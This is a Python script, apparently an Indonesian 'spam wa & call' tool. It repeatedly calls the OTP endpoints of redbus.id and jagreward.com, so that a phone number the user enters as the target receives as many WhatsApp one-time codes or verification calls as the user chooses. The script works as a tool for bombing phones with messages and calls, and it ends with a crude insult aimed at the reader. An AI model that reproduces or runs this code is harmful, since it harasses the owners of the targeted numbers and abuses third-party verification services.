'''
hello i'am khamdihi, i'am from purbalingga
pemrograman spam wa & call by khamdihiXD
github : https://github.com/khamdihuXD
'''
import os, sys, time ,requests, json

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

def Menu():
     os.system('clear')
     print(' [%s1%s] Spam whatsaap (new)'%(O,N))
     print(' [%s2%s] Spam call and sms (new)'%(O,N))
     print(' [%s0%s] Kembali (exit)\n'%(O,N))
     rokok = input(' [%s?%s] choose : '%(O,N))
     if rokok in ['1','01']:
           return whatsaap()
     elif rokok in ['2','02']:
           return call()
def whatsaap():
     jumlah = int(input('\n [%s?%s] Limit spam : '%(O,N)))
     no = input(' [%s?%s] Masukan nomer (858) : '%(O,N))
     print('')
     if no in ['']:
           exit(' [%s×%s] jangan kosong'%(M,N))
     else:
           try:
                respon = {
                "Host": "m.redbus.id",
                "traceparent": "00-be085642dceaf86f7a1ab2fa021cd6e3-1a6cbeb5e59f3ac9-01",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                "sec-ch-ua-platform": "Android",
                "accept": "*/*",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://m.redbus.id/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                }
                for a in range(jumlah):
                        url = requests.get(f'https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true&disableOtpFlow=undefined')
                        z = json.loads(url.text)['Message']
                        if 'OTP Sent Successfully' in z:
                               print(' [%s√%s] sukses kirim ke : %s'%(H,N,no))
                        elif "200" in z:
                               print(' [%s×%s] sudah mencapai Limit '%(M,N))
                        else:
                               print(' [%s×%s] gagal kirim ke  : %s'%(M,N,no))

           except requests.exceptions.ConnectionError:
                exit(' [%s×%s] cek koneksi'%(M,N))

def call():
      jumlah = int(input('\n [%s+%s] Limit spam : '%(O,N)))
      Number = input(' [%s?%s] target nomer : '%(O,N))
      print('')
      if Number in ['']:
            exit(' [%s×%s] Jangan kosong om'%(M,N))
      else:
            try:
                  head = {
                  "Host": "id.jagreward.com",
                  "Connection": "keep-alive",
                  "Accept": "*/*",
                  "X-Requested-With": "XMLHttpRequest",
                  "sec-ch-ua-mobile": "?1",
                  "User-Agent": "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
                  "sec-ch-ua-platform": "Android",
                  "Sec-Fetch-Site": "same-origin",
                  "Sec-Fetch-Mode": "cors",
                  "Sec-Fetch-Dest": "empty",
                  "Referer": "https://id.jagreward.com/member/register/",
                  "Accept-Encoding": "gzip, deflate, br",
                  "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                  }

                  respons = {
                  "method": "CALL",
                  "countryCode": "id",
                  }
                  for a in range(jumlah):
                      url = (f'https://id.jagreward.com/member/verify-mobile/{Number}/')
                      req = requests.get(url, data=respons, headers=head)
                      xx = json.loads(req.text)['message']
                      if "Tolong masukkan nomor telepon anda dengan benar" in xx:
                               exit(' [%s×%s] Masukan nomer tanpa kosong contoh : 858***'%(M,N))
                      elif "Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini." in xx:
                               print(' [%s√%s] sukses kirim ke : %s'%(H,N,Number))
                      else:
                               print(' [%s×%s] Gagal mengirim ke : %s'%(M,N,Number))
            except requests.exceptions.ConnectionError:
                      exit(' [%s×%s] Cek koneksi kamu'%(M,N))

if __name__ == '__main__':
   Menu()


# Yang baca ngentod
